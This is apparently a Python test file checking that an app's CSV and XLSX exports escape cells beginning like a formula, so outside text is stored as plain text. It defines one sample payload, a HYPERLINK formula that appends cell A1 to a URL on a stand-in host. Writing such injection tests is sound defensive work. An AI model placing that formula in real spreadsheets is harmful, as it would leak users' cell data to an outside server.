"""Outside text never becomes a formula in an export (review 2026-10-24)."""

import io

from openpyxl import load_workbook

from app.modules.export.service import to_csv, to_xlsx

EVIL = '=HYPERLINK("http://x/?"&A1,"click")'


def test_csv_cells_that_start_like_a_formula_are_text():
    text = to_csv(["asset"], [[EVIL], ["-5"], ["BTC"]], "de").decode("utf-8-sig")
    assert "'=HYPERLINK" in text and "'-5" in text and "\r\nBTC\r\n" in text


def test_xlsx_cells_that_start_like_a_formula_are_text():
    book = load_workbook(io.BytesIO(to_xlsx("Export", ["asset"], [[EVIL]])))
    cell = book.active["A2"]
    assert cell.data_type == "s" and cell.value == EVIL
